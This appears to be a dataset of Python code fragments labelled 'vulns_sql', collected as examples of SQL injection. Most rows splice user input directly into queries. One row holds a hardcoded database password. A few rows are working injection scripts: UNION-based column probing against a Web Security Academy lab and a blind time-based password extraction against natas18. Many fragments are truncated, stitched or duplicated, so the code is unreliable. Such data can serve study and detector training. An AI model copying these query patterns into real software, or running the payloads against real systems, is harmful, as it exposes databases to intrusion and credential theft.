"def write_preset(conn, queryin, descriptin):	cursor = conn.cursor()	quer = ""ALTER TABLE Presets DROP COLUMN id;""	cursor.execute(quer)	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""	cursor.execute(quer)	extable = Table('Presets')	q = MySQLQuery.into(extable).columns(""querval"", ""description"").insert(queryin, descriptin)	print(q)	quer = str(q)	cursor.execute(quer)	quer = ""ALTER TABLE Presets DROP COLUMN id;""	cursor.execute(quer)	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""	cursor.execute(quer)def edit_preset(conn, key, queryin, descriptin):	cursor = conn.cursor()	quer = ""ALTER TABLE Presets DROP COLUMN id;""	cursor.execute(quer)	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""	cursor.execute(quer)	if (queryin != ""NA""):		quer = ""UPDATE Presets SET querval='""+queryin+""' WHERE id=""+str(key)+"";""		cursor.execute(quer)	if (descriptin != ""NA""):		quer = ""UPDATE Presets SET description='""+descriptin+""' WHERE id=""+str(key)+"";""		cursor.execute(quer)	quer = ""ALTER TABLE Presets DROP COLUMN id;""	cursor.execute(quer)	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""	cursor.execute(quer)	cursor = conn.cursor()	quer = ""ALTER TABLE Presets DROP COLUMN id;""	cursor.execute(quer)	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""	cursor.execute(quer)	quer = ""DELETE FROM Presets WHERE id = "" +key;	cursor.execute(quer)	quer = ""ALTER TABLE Presets DROP COLUMN id;""	cursor.execute(quer)	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""	cursor.execute(quer)def get_preset(conn, key):	cursor = conn.cursor()	quer = ""ALTER TABLE Presets DROP COLUMN id;""	cursor.execute(quer)	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""	cursor.execute(quer)	extable = Table('Presets')	q = MySQLQuery.from_(extable).select(		extable.querval	).where(		extable.id == key	)	print(q)	quer = str(q)	cursor.execute(quer)	row = cursor.fetchone()	strrow = str(row)	return (strrow[2:-3])def get_descriptin(conn, key):	cursor = conn.cursor()	quer = ""ALTER TABLE Presets DROP COLUMN id;""	cursor.execute(quer)	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""	cursor.execute(quer)	extable = Table('Presets')	q = MySQLQuery.from_(extable).select(		extable.description	).where(		extable.id == key	)	print(q)	quer = str(q)	cursor.execute(quer)	row = cursor.fetchone()	strrow = str(row)	return (strrow[2:-3])",vulns_sql
"def write_preset(conn, queryin, descriptin):	cursor = conn.cursor()	quer = ""ALTER TABLE Presets DROP COLUMN id;""	cursor.execute(quer)	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""	cursor.execute(quer)	extable = Table('Presets')	q = MySQLQuery.into(extable).columns(""querval"", ""description"").insert(queryin, descriptin)	print(q)	quer = str(q)	cursor.execute(quer)	quer = ""ALTER TABLE Presets DROP COLUMN id;""	cursor.execute(quer)	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""	cursor.execute(quer)def edit_preset(conn, key, queryin, descriptin):	cursor = conn.cursor()	quer = ""ALTER TABLE Presets DROP COLUMN id;""	cursor.execute(quer)	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""	cursor.execute(quer)	if (queryin != ""NA""):		quer = ""UPDATE Presets SET querval='""+queryin+""' WHERE id=""+str(key)+"";""		cursor.execute(quer)	if (descriptin != ""NA""):		quer = ""UPDATE Presets SET description='""+descriptin+""' WHERE id=""+str(key)+"";""		cursor.execute(quer)	quer = ""ALTER TABLE Presets DROP COLUMN id;""	cursor.execute(quer)	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""	cursor.execute(quer)	cursor = conn.cursor()	quer = ""ALTER TABLE Presets DROP COLUMN id;""	cursor.execute(quer)	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""	cursor.execute(quer)	quer = ""DELETE FROM Presets WHERE id = "" +key;	cursor.execute(quer)	quer = ""ALTER TABLE Presets DROP COLUMN id;""	cursor.execute(quer)	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""	cursor.execute(quer)def get_preset(conn, key):	cursor = conn.cursor()	quer = ""ALTER TABLE Presets DROP COLUMN id;""	cursor.execute(quer)	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""	cursor.execute(quer)	extable = Table('Presets')	q = MySQLQuery.from_(extable).select(		extable.querval	).where(		extable.id == key	)	print(q)	quer = str(q)	cursor.execute(quer)	row = cursor.fetchone()	strrow = str(row)	return (strrow[2:-3])def get_descriptin(conn, key):	cursor = conn.cursor()	quer = ""ALTER TABLE Presets DROP COLUMN id;""	cursor.execute(quer)	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""	cursor.execute(quer)	extable = Table('Presets')	q = MySQLQuery.from_(extable).select(		extable.description	).where(		extable.id == key	)	print(q)	quer = str(q)	cursor.execute(quer)	row = cursor.fetchone()	strrow = str(row)	return (strrow[2:-3])",vulns_sql
            print 'Error connect',vulns_sql
"                scope =  scop #vpn                cursor.execute(""""""INSERT INTO tasks(redminetask,redmineuser,username,email,scope,status) VALUES (%s,%s,%s,%s,%s,%s)"""""",(issue.id,redminetask,username,email,scope,status))                print 'Execute Error mysql'",vulns_sql
                    print(row),vulns_sql
"            SELECT ail.id, ai.date_invoice",vulns_sql
"            WHERE pt.id = %d AND            ORDER BY abs(ai.date_invoice - date '%s')        """""" % (prod.id, in_date)        self._cr.execute(query)        invoice_lines = self._cr.fetchall()        if invoice_lines:            for invoice_line in invoice_lines:",vulns_sql
"                             vendors_code, date):",vulns_sql
                   vendors_code=False): Si el costo es cero y es bulonfer se pone obsoleto y termina.,vulns_sql
"        self.conn.execute(r""""""INSERT INTO webpages(title, content, url) VALUES ('%s', '%s', '%s')"""""" %",vulns_sql
"        compute='_phonecall_count',    def _phonecall_count(self):",vulns_sql
"        self._cr.execute(""""""            )"""""" % (self._table, self._select(), self._from()))",vulns_sql
"    try:        return db.engine.execute(""""""            WHERE signature_fresh.freshman_username = '"""""" + member + ""';"")",vulns_sql
"    try:        return db.engine.execute(""""""            WHERE signature_upper.member = '"""""" + member + ""';"")",vulns_sql
"    try:        return db.engine.execute(""""""            WHERE signature_misc.member = '"""""" + member + ""' OR signature_misc.member ISNULL;"")",vulns_sql
import help_functions,vulns_sql
"        ""lookup"":   customer_commands.process_lookup",vulns_sql
    return freq_shop_id    user = query.find_customer(username)        return user[7],vulns_sql
    id = get_customer_id(query),vulns_sql
"    print(""\tuserinfo command id="" + str(id))    pass",vulns_sql
"            'SELECT upc, name, weight, description FROM product WHERE description ILIKE \'%%%s%%\';',            (product_desc,)            'SELECT upc, name, weight, description FROM product WHERE name ILIKE \'%%%s%%\';',            (product_name,)            'SELECT upc, name, weight, description FROM product WHERE upc ILIKE \'%%%s%%\';',            (product_upc,)",vulns_sql
"    def find_customer(self, username):",vulns_sql
"                      'title': titles[i].text,",vulns_sql
"        form_display_name = request.form['form_display_name']        form_author_name = request.form['form_author_name']        form_body_content = request.form['form_body_content']        form_body_content = form_body_content.replace('""', '\\""')",vulns_sql
"	c.execute(""INSERT INTO npc VALUES ('""+date+""','""+str(name)+""','""+race+""','""+classe+""','""+sex+""','""+str(level)+""','""+image+""','""+str(legit)+""')"")",vulns_sql
"	c.execute(""select image, avg(legit) as l FROM npc WHERE race='""+race+""' AND class='""+classe+""' AND sex='""+sex+""' GROUP BY image HAVING l > 5 ORDER BY SUM(legit) DESC;"")",vulns_sql
"	c.execute(""INSERT INTO usage (date,user,command) VALUES ('""+date+""','""+str(user)+""','""+command+""')"")",vulns_sql
"    query = ""SELECT volume, mcap FROM assets WHERE aid='""+asset_id+""'""    cur.execute(query)",vulns_sql
"    query = ""SELECT * FROM markets WHERE aid='""+asset_id+""'""    cur.execute(query)",vulns_sql
"        query = ""SELECT account_name, amount FROM holders WHERE account_id='""+proxy_id+""' LIMIT 1""        cur.execute(query)",vulns_sql
"        query = ""SELECT amount, account_id FROM holders WHERE voting_as='""+proxy_id+""'""        cur.execute(query)",vulns_sql
"    query = ""SELECT aname FROM assets WHERE aname LIKE '""+start+""%'""    cur.execute(query)",vulns_sql
"    query = ""select count(*) from referrers where referrer='""+account_id+""'""    cur.execute(query)",vulns_sql
"    query = ""select * from referrers where referrer='""+account_id+""'""    cur.execute(query)",vulns_sql
"    query = ""UPDATE ops set oid=""+str(x+1)+"" WHERE oid IN (SELECT oid FROM ops ORDER BY oid LIMIT 1 OFFSET ""+str(x)+"");""    cur.execute(query)",vulns_sql
"        query = ""INSERT INTO assets (aname, aid, price, volume, mcap, type, current_supply, holders, wallettype, precision) VALUES('""+symbol+""', '""+asset_id+""', '""+price+""', '""+data['base_volume']+""', '""+str(mcap)+""', '""+type_+""', '""+str(current_supply)+""', '""+str(holders)+""', '','""+str(precision)+""')""        print query        cur.execute(query)",vulns_sql
"query = ""INSERT INTO stats (type, value, date) VALUES('volume_bts', '""+str(int(round(volume)))+""', NOW())""cur.execute(query)",vulns_sql
"query = ""INSERT INTO assets (aname, aid, price, volume, mcap, type, current_supply, holders, wallettype) VALUES('BTS', '1.3.0', '1', '""+str(volume)+""', '""+str(mcap)+""', 'Core Token', '"" + str(current_supply) + ""', '"" + str(holders) + ""', '')""cur.execute(query)",vulns_sql
"        query = ""INSERT INTO holders (account_id, account_name, amount, voting_as) VALUES('""+account_id+""', '""+account_name+""','""+str(amount)+""', '""+voting_account+""')""        cur.execute(query)",vulns_sql
"                    query = ""INSERT INTO markets (pair, asset_id, price, volume, aid) VALUES('""+row[1]+ ""/"" + symbol+""', '""+str(row[0])+""', '""+str(float(price))+""', '""+str(float(volume))+""', '""+row[2]+""')""                    cur.execute(query)",vulns_sql
"            query = ""INSERT INTO ops (oh, ath, block_num, trx_in_block, op_in_trx, datetime, account_id, op_type, account_name) VALUES('""+id_+""', '""+data[0][""operation_id""]+""', '""+str(block_num)+""', '""+str(trx_in_block)+""', '""+str(op_in_trx)+""', NOW(), '""+account_id+""', '""+str(op_type)+""', '""+account_name+""')""            cur.execute(query)",vulns_sql
"                ""VALUES('""+account_id+""', '""+account_name+""','""+referrer+""', '""+str(referrer_rewards_percentage)+""','""+lifetime_referrer+""', '""+str(lifetime_referrer_fee_percentage)+""')""        cur.execute(query)",vulns_sql
"    password=""navi98%"",    database=""DB_work""	query=""SELECT img_path, img_name\			FROM imageTable""	cursor.execute(query)	return render_template('index.html', images=cursor)@app.route('/<pic_name>')def view_comment(pic_name):	query= 'SELECT comment, comment_id, img_name\			FROM commentsTable'	cursor.execute(query)	return render_template('static_page.html', names=cursor, pic_name=pic_name)@app.route('/submit_comment/<pic_name>', methods=['POST', 'GET'])def submit_comment(pic_name=None):	if request.method == 'POST':		query = ""INSERT INTO commentsTable(comment, img_name)\				VALUES('%s', '%s')"" % (request.form['comment'], request.form['image-name'])		cursor.execute(query)		db.commit()		return redirect(url_for('view_comment', pic_name=pic_name))@app.route('/delete_comment/<pic_name>', methods=['POST', 'GET'])def delete_comment(pic_name=None):	if request.method == 'POST':		query = ""DELETE FROM commentsTable\				WHERE comment_id = '%s'"" % request.form['delete_comment']		cursor.execute(query)		db.commit()		return redirect(url_for('view_comment', pic_name=pic_name))@app.route('/edit_comment/<pic_name>', methods=['POST', 'GET'])def edit_comment(pic_name=None):	edit_value = request.form['edit_comment']		return render_template('edit_page.html', edit_value=edit_value, pic_name=pic_name)	if request.method == 'POST':		query = ""UPDATE commentsTable\		cursor.execute(query)		db.commit()	return redirect(url_for('view_comment', pic_name=pic_name))	if request.method == 'POST':		f = request.files['image_upload']		f.save('/home/pr0phet/MyProjects/Web/static/' + f.filename)		query = ""INSERT INTO imageTable(img_path, img_name)\				VALUES('%s', '%s')"" % (('/static/' + f.filename), (f.filename))		cursor.execute(query)		db.commit()		return redirect(url_for('index'))",vulns_sql
"    query = ""SELECT volume, mcap FROM assets WHERE aid='""+asset_id+""'""    cur.execute(query)",vulns_sql
"    query = ""SELECT * FROM markets WHERE aid='""+asset_id+""'""    cur.execute(query)",vulns_sql
"        query = ""SELECT account_name, amount FROM holders WHERE account_id='""+proxy_id+""' LIMIT 1""        cur.execute(query)",vulns_sql
"        query = ""SELECT amount, account_id FROM holders WHERE voting_as='""+proxy_id+""'""        cur.execute(query)",vulns_sql
"    query = ""SELECT aname FROM assets WHERE aname LIKE '""+start+""%'""    cur.execute(query)",vulns_sql
"    query = ""select count(*) from referrers where referrer='""+account_id+""'""    cur.execute(query)",vulns_sql
"    query = ""select * from referrers where referrer='""+account_id+""'""    cur.execute(query)",vulns_sql
"    query = ""UPDATE ops set oid=""+str(x+1)+"" WHERE oid IN (SELECT oid FROM ops ORDER BY oid LIMIT 1 OFFSET ""+str(x)+"");""    cur.execute(query)",vulns_sql
"        query = ""INSERT INTO assets (aname, aid, price, volume, mcap, type, current_supply, holders, wallettype, precision) VALUES('""+symbol+""', '""+asset_id+""', '""+price+""', '""+data['base_volume']+""', '""+str(mcap)+""', '""+type_+""', '""+str(current_supply)+""', '""+str(holders)+""', '','""+str(precision)+""')""        print query        cur.execute(query)",vulns_sql
"query = ""INSERT INTO stats (type, value, date) VALUES('volume_bts', '""+str(int(round(volume)))+""', NOW())""cur.execute(query)",vulns_sql
"query = ""INSERT INTO assets (aname, aid, price, volume, mcap, type, current_supply, holders, wallettype) VALUES('BTS', '1.3.0', '1', '""+str(volume)+""', '""+str(mcap)+""', 'Core Token', '"" + str(current_supply) + ""', '"" + str(holders) + ""', '')""cur.execute(query)",vulns_sql
"        query = ""INSERT INTO holders (account_id, account_name, amount, voting_as) VALUES('""+account_id+""', '""+account_name+""','""+str(amount)+""', '""+voting_account+""')""        cur.execute(query)",vulns_sql
"                    query = ""INSERT INTO markets (pair, asset_id, price, volume, aid) VALUES('""+row[1]+ ""/"" + symbol+""', '""+str(row[0])+""', '""+str(float(price))+""', '""+str(float(volume))+""', '""+row[2]+""')""                    cur.execute(query)",vulns_sql
"            query = ""INSERT INTO ops (oh, ath, block_num, trx_in_block, op_in_trx, datetime, account_id, op_type, account_name) VALUES('""+id_+""', '""+data[0][""operation_id""]+""', '""+str(block_num)+""', '""+str(trx_in_block)+""', '""+str(op_in_trx)+""', NOW(), '""+account_id+""', '""+str(op_type)+""', '""+account_name+""')""            cur.execute(query)",vulns_sql
"                ""VALUES('""+account_id+""', '""+account_name+""','""+referrer+""', '""+str(referrer_rewards_percentage)+""','""+lifetime_referrer+""', '""+str(lifetime_referrer_fee_percentage)+""')""        cur.execute(query)",vulns_sql
"    query = ""SELECT volume, mcap FROM assets WHERE aid='""+asset_id+""'""    cur.execute(query)",vulns_sql
"    query = ""SELECT * FROM markets WHERE aid='""+asset_id+""'""    cur.execute(query)",vulns_sql
"        query = ""SELECT account_name, amount FROM holders WHERE account_id='""+proxy_id+""' LIMIT 1""        cur.execute(query)",vulns_sql
"        query = ""SELECT amount, account_id FROM holders WHERE voting_as='""+proxy_id+""'""        cur.execute(query)",vulns_sql
"    query = ""SELECT aname FROM assets WHERE aname LIKE '""+start+""%'""    cur.execute(query)",vulns_sql
"    query = ""select count(*) from referrers where referrer='""+account_id+""'""    cur.execute(query)",vulns_sql
"    query = ""select * from referrers where referrer='""+account_id+""'""    cur.execute(query)",vulns_sql
"    query = ""UPDATE ops set oid=""+str(x+1)+"" WHERE oid IN (SELECT oid FROM ops ORDER BY oid LIMIT 1 OFFSET ""+str(x)+"");""    cur.execute(query)",vulns_sql
"        query = ""INSERT INTO assets (aname, aid, price, volume, mcap, type, current_supply, holders, wallettype, precision) VALUES('""+symbol+""', '""+asset_id+""', '""+price+""', '""+data['base_volume']+""', '""+str(mcap)+""', '""+type_+""', '""+str(current_supply)+""', '""+str(holders)+""', '','""+str(precision)+""')""        print query        cur.execute(query)",vulns_sql
"query = ""INSERT INTO stats (type, value, date) VALUES('volume_bts', '""+str(int(round(volume)))+""', NOW())""cur.execute(query)",vulns_sql
"query = ""INSERT INTO assets (aname, aid, price, volume, mcap, type, current_supply, holders, wallettype) VALUES('BTS', '1.3.0', '1', '""+str(volume)+""', '""+str(mcap)+""', 'Core Token', '"" + str(current_supply) + ""', '"" + str(holders) + ""', '')""cur.execute(query)",vulns_sql
"        query = ""INSERT INTO holders (account_id, account_name, amount, voting_as) VALUES('""+account_id+""', '""+account_name+""','""+str(amount)+""', '""+voting_account+""')""        cur.execute(query)",vulns_sql
"                    query = ""INSERT INTO markets (pair, asset_id, price, volume, aid) VALUES('""+row[1]+ ""/"" + symbol+""', '""+str(row[0])+""', '""+str(float(price))+""', '""+str(float(volume))+""', '""+row[2]+""')""                    cur.execute(query)",vulns_sql
"            query = ""INSERT INTO ops (oh, ath, block_num, trx_in_block, op_in_trx, datetime, account_id, op_type, account_name) VALUES('""+id_+""', '""+data[0][""operation_id""]+""', '""+str(block_num)+""', '""+str(trx_in_block)+""', '""+str(op_in_trx)+""', NOW(), '""+account_id+""', '""+str(op_type)+""', '""+account_name+""')""            cur.execute(query)",vulns_sql
"                ""VALUES('""+account_id+""', '""+account_name+""','""+referrer+""', '""+str(referrer_rewards_percentage)+""','""+lifetime_referrer+""', '""+str(lifetime_referrer_fee_percentage)+""')""        cur.execute(query)",vulns_sql
    c.execute('''        select name from sqlite_master        where type='table' and name='wallpapers'        '''),vulns_sql
"        c.execute('''            select * from wallpapers            where image_date='{}'            '''.format(image_date))            c.execute('''                insert into wallpapers (image_date, url_base, copyright)                values ('{}', '{}', '{}')                '''.format(image_date, url_base, copyright))",vulns_sql
"            db.insert('users', {""nome"":post['nome'].value, ""sobrenome"":post['sobrenome'].value, ""endereco"":post['endereco'].value })",vulns_sql
"            db.delete_where('users', 'id = {}'.format(delete['id'].value))            return [str.encode(json.dumps({""success"":""false"",""error"": 500,""method"": ""DELETE"", ""msg"": ""No foi possvel deletar contato""}))]            db.update_where('users',""nome = '""+ put['nome'].value +""', sobrenome = '""+ put['sobrenome'].value +""', endereco = '""+ put['endereco'].value + ""'"", 'id = ' + put['id'].value)",vulns_sql
"            json_data = db.select('users')            return [str.encode(json.dumps({""success"":""false"",""error"": 500,""method"": ""GET"", ""msg"": ""No foi possvel retornar tabela""}))]",vulns_sql
"	def select(self, table):		self.cursor.execute(""SELECT * FROM {0}"".format( table))",vulns_sql
"	def insert(self, table, content):",vulns_sql
"		data_user = (nome, sobrenome, endereco)",vulns_sql
"	def delete_where(self, table, where):		    self.cursor.execute(""DELETE FROM {0} WHERE {1}"".format(table, where))	def update_where(self, table, info, where):		    self.cursor.execute(""UPDATE {0} SET {1} WHERE {2}"".format(table, info, where))",vulns_sql
"def get_table_dict(table):    database = sqlite3.connect('app.db')    cur = database.execute('select * from {} order by timestamp desc'.format(table))    columns = [column[0] for column in cur.description]    results = []    for row in cur.fetchall():        results.append(dict(zip(columns, row)))    return results",vulns_sql
    results = get_table_dict('Article'),vulns_sql
        results = get_table_dict('Article'),vulns_sql
        results = get_table_dict('Post'),vulns_sql
"            self.logger.info(""No cms was detected on target %s"" % base)",vulns_sql
    headers = {},vulns_sql
"    def get(self, url):        result = requests.get(url, allow_redirects=False, headers=self.headers, cookies=self.cookies)        return result",vulns_sql
"        text = self.get(url).text        version_check_1 = re.search('<meta name=""generator"" content=""wordpress (\d+\.\d+\.\d+)', text, re.IGNORECASE)        if version_check_1:            return version_check_1.group(1)        result = self.get(check2_url).text        version_check_2 = re.search('wp-admin\.min\.css\?ver=(\d+\.\d+\.\d+)', result, re.IGNORECASE)        if version_check_2:            return version_check_2.group(1)",vulns_sql
"    def match_versions(self, version, fixed_in):        if version == fixed_in:            return False        parts_version = version.split('.')        parts_fixed_in = fixed_in.split('.')        if len(parts_version) <= len(parts_fixed_in):            for x in range(len(parts_version)):                if int(parts_version[x]) < int(parts_fixed_in[x]):                    return True                if int(parts_version[x]) > int(parts_fixed_in[x]):                    return False            return False        else:            for x in range(len(parts_fixed_in)):                if int(parts_version[x]) < int(parts_fixed_in[x]):                    return True                if int(parts_version[x]) > int(parts_fixed_in[x]):                    return False            return False        with open(self.cache_file(self.version_cache_file), 'r') as f:",vulns_sql
"        plugins = {}        with open(self.cache_file(self.plugin_cache_file), 'r') as f:            data = f.read().strip()        json_data = json.loads(data)        for x in json_data:            if json_data[x]['popular'] or self.aggressive:                plugins[x] = json_data[x]        return plugins        if get_result:",vulns_sql
"            with open(self.cache_file(self.plugin_cache_file), 'w') as f:                x = data1.text.encode('ascii', 'ignore')            with open(self.cache_file(self.version_cache_file), 'w') as f:                x = data2.text.encode('ascii', 'ignore')            self.logger.error(""Error updating databases"" % str(e))",vulns_sql
"        self.name = ""Blind SQL Injection""",vulns_sql
"            self.logger.info(""No cms was detected on target %s"" % base)",vulns_sql
    headers = {},vulns_sql
"    def get(self, url):        result = requests.get(url, allow_redirects=False, headers=self.headers, cookies=self.cookies)        return result",vulns_sql
"        text = self.get(url).text        version_check_1 = re.search('<meta name=""generator"" content=""wordpress (\d+\.\d+\.\d+)', text, re.IGNORECASE)        if version_check_1:            return version_check_1.group(1)        result = self.get(check2_url).text        version_check_2 = re.search('wp-admin\.min\.css\?ver=(\d+\.\d+\.\d+)', result, re.IGNORECASE)        if version_check_2:            return version_check_2.group(1)",vulns_sql
"    def match_versions(self, version, fixed_in):        if version == fixed_in:            return False        parts_version = version.split('.')        parts_fixed_in = fixed_in.split('.')        if len(parts_version) <= len(parts_fixed_in):            for x in range(len(parts_version)):                if int(parts_version[x]) < int(parts_fixed_in[x]):                    return True                if int(parts_version[x]) > int(parts_fixed_in[x]):                    return False            return False        else:            for x in range(len(parts_fixed_in)):                if int(parts_version[x]) < int(parts_fixed_in[x]):                    return True                if int(parts_version[x]) > int(parts_fixed_in[x]):                    return False            return False        with open(self.cache_file(self.version_cache_file), 'r') as f:",vulns_sql
"        plugins = {}        with open(self.cache_file(self.plugin_cache_file), 'r') as f:            data = f.read().strip()        json_data = json.loads(data)        for x in json_data:            if json_data[x]['popular'] or self.aggressive:                plugins[x] = json_data[x]        return plugins        if get_result:",vulns_sql
"            with open(self.cache_file(self.plugin_cache_file), 'w') as f:                x = data1.text.encode('ascii', 'ignore')            with open(self.cache_file(self.version_cache_file), 'w') as f:                x = data2.text.encode('ascii', 'ignore')            self.logger.error(""Error updating databases"" % str(e))",vulns_sql
"        self.name = ""Blind SQL Injection""",vulns_sql
"        (""matched_id"", 'matched_id'),",vulns_sql
"    if not any(order_column for expression, alias in columns):",vulns_sql
"        sql = ""SELECT * FROM deposits WHERE coin='%s'"" % coin        self.cursor.execute(sql)",vulns_sql
"    def runOperation(self, operation):            yield self.connection.runOperation(operation)            print(""ERROR: Running operation %s"" %operation)    def runQuery(self, query):            answer = yield self.connection.runQuery(query)            print(""ERROR: Running query %s"" %query)",vulns_sql
"        values = "","".join([x.encode(""utf-8"") for x in query.values.values()])                    .format(query.model_class._meta.table_name, keys, values))                         .format("","".join(query.on_conflict), keys, values))        return str_query",vulns_sql
"        values = "","".join([x.encode(""utf-8"") for x in query.values.values()])                        .format(query.model_class._meta.table_name, keys, values, _id))",vulns_sql
        return str_query,vulns_sql
"        value = u""'{0}'"".format(value)",vulns_sql
"        value = u""'{0}'"".format(value)",vulns_sql
"        value = u""'{0}'"".format(value)",vulns_sql
"        value = u""'{0}'"".format(value)",vulns_sql
"        value = u""'{0}'"".format(value)",vulns_sql
"        value = u""'{0}'"".format(value)        return value",vulns_sql
"        value = u""'{0}'"".format(value)",vulns_sql
"        value = u""'{0}'"".format(value)",vulns_sql
        query = self.database.generate_insert(self)            result = yield self.database.runQuery(query)            yield self.database.runOperation(query),vulns_sql
        query = self.database.generate_update(self)            result = yield self.database.runQuery(query)            yield self.database.runOperation(query),vulns_sql
if env.name == None:,vulns_sql
"    except:    ''' # currently, specific to postgres",vulns_sql
    if env.name == None:,vulns_sql
    except:,vulns_sql
    except:,vulns_sql
        cursor.execute(            ''' SELECT karma FROM people WHERE name='{}' '''.format(name)),vulns_sql
            AS row_Num FROM people AS t1 WHERE name='{}'        '''.format(name)),vulns_sql
"                INSERT INTO people(name,karma,shame) VALUES('{}',1,0)                '''.format(name))",vulns_sql
"                UPDATE people SET karma = {0} WHERE name = '{1}'                '''.format(karma, name))                karma, name))",vulns_sql
"                INSERT INTO people(name,karma,shame) VALUES('{}',-1,0)                '''.format(name))",vulns_sql
"                UPDATE people SET karma = {0} WHERE name = '{1}'                '''.format(karma, name))",vulns_sql
            SELECT shame FROM people WHERE name='{}'            '''.format(name)),vulns_sql
"                INSERT INTO people(name,karma,shame) VALUES('{}',0,1)                '''.format(name))",vulns_sql
"                UPDATE people SET shame = {0} WHERE name = '{1}'                '''.format(shame, name))",vulns_sql
"            INSERT INTO isalso(name,also) VALUES('{}','{}')            '''.format(name, also))",vulns_sql
"    if env.name == None:            SELECT also FROM isalso WHERE name='{0}' ORDER BY {1} LIMIT 1            '''.format(name, r))",vulns_sql
ESCAPE_RE = re.compile(r'^-?[a-zA-Z][a-zA-Z0-9_\.]*$')    elif ESCAPE_RE.match(col):,vulns_sql
"class Literal(object):    def __init__(self, literal):        self.literal = literal",vulns_sql
"        expr = (expr[0] + (Literal('\'\''),),) + expr[1:]",vulns_sql
"    Escape a literal value for use in a SQL clause    if isinstance(value, Literal):        return value.literal    elif isinstance(value, six.string_types):        value = value.replace(""'"", ""\\'"")",vulns_sql
"        assert escape_literal(""'"") == r""'\''""",vulns_sql
"            query = ""INSERT INTO crimes (description) VALUES('{}');"".format(data)                cursor.execute(query)",vulns_sql
"result = StringIO.StringIO()c.setopt(pycurl.WRITEFUNCTION, result.write)def auto_detect(track_id):    url = 'http://www.kuaidi100.com/autonumber/autoComNum'    c.setopt(pycurl.CUSTOMREQUEST, 'POST')        c.setopt(pycurl.URL, url + '?text=' + track_id)",vulns_sql
    s = result.getvalue()    return json.loads(s[s.index('}]}') + 3:]),vulns_sql
"    sql_cmd = 'SELECT track_id,username,chat_id FROM job WHERE done=0'    s = db.select(sql_cmd)",vulns_sql
"            query = ""INSERT INTO crimes (description) VALUES ('{}');"".format(data)                cursor.execute(query)",vulns_sql
"url = 'https://abcd.web-security-academy.net/page'null = [""'UNION"", 'SELECT', 'NULL', '--']response = api_session.get(url, params=sqli)def sqli_union_1_lab(response):    while not response.ok:        null.pop(-1)        response = api_session.get(url, params=sqli)def sqli_union_2_lab(response, null):    column = 0    while not response.ok:        step = (index + 1)        column += 1        null[index] = ""'VULNERABLE_STRING'""        response = api_session.get(url, params=sqli)        null[index] = ""NULL""if __name__ == '__main__':    null = sqli_union_1_lab(response=response)    sqli_union_2_lab(response=response, null=null)",vulns_sql
"url = 'https://abcd.web-security-academy.net/page'null = [""'UNION"", 'SELECT', 'NULL', '--']response = api_session.get(url, params=sqli)while not response.ok:    null.pop(-1)    null.extend([',NULL', '--'])    sqli['category'] = f""Lifestyle{' '.join(null)}""    response = api_session.get(url, params=sqli)print(f""There are {null.count('NULL') + null.count(',NULL')} columns:"")print(response.url)",vulns_sql
import re,vulns_sql
"for row in db.execute(""SELECT * FROM contacts""):",vulns_sql
"while ( len(seen_password) < 32 ):		response = session.post(url, data = {""username"": 'natas18"" AND BINARY password LIKE ""' + """".join(seen_password) + character +  '%"" AND SLEEP(1) # '}, auth = (username, password) )        content = response.text		        print(content)",vulns_sql
"""""""[todo] Replace query string concatenations with DB-APIs parametersubstitution to avoid SQL injection attacks.""""""",vulns_sql
"    cursor.execute(f""""""",vulns_sql
"            issue.id = {id}    """""")",vulns_sql
"    cursor.execute(f""""""        INSERT INTO issue (            title,            description        )        VALUES (            ""{issue[""title""]}"",            ""{issue.get(""description"", """")}""        )    """""")            INSERT INTO tag (                namespace,                predicate,                value,                issue_id            )            VALUES (                ""{tag.get(""namespace"", """")}"",                ""{tag.get(""predicate"", """")}"",                ""{tag.get(""value"", """")}"",                ""{issue_id}""            )        """""")",vulns_sql
"    set_clause_args = "", "".join(map(        lambda kv: f""{kv[0]} = \""{kv[1]}\"""",        updated_fields.items(),    ))        cursor.execute(f""""""            UPDATE issue            SET {set_clause_args}            WHERE id = {id}        """""")    cursor.execute(f""""""        DELETE FROM tag        WHERE issue_id = {id}    """""")        cursor.execute(f""""""            VALUES (                ""{tag[""namespace""]}"",                ""{tag[""predicate""]}"",                ""{tag[""value""]}"",                ""{id}""            )        """""")",vulns_sql
"			query = ""INSERT INTO crimes (description) VALUES('{}');"".format(data)				cursor.execute(query)",vulns_sql
    students = Student.objects.raw('select * from sio_student where first_name = \'' + first_name + '\''),vulns_sql
"        'PASSWORD': '',",vulns_sql
print(field_names),vulns_sql
	print(record_),vulns_sql
"    version='0.1',",vulns_sql
"                            ""user_pass "" \                            ""{0}users "" \                            ""user_login = \""{1}\"""" \                    .format(self.table_prefix, data[""username""])            if cursor.execute(sql) == 0:",vulns_sql
    start_date_param = query_dict.get('startDate') or query_dict.get('startdate')    end_date_param = query_dict.get('endDate') or query_dict.get('enddate'),vulns_sql
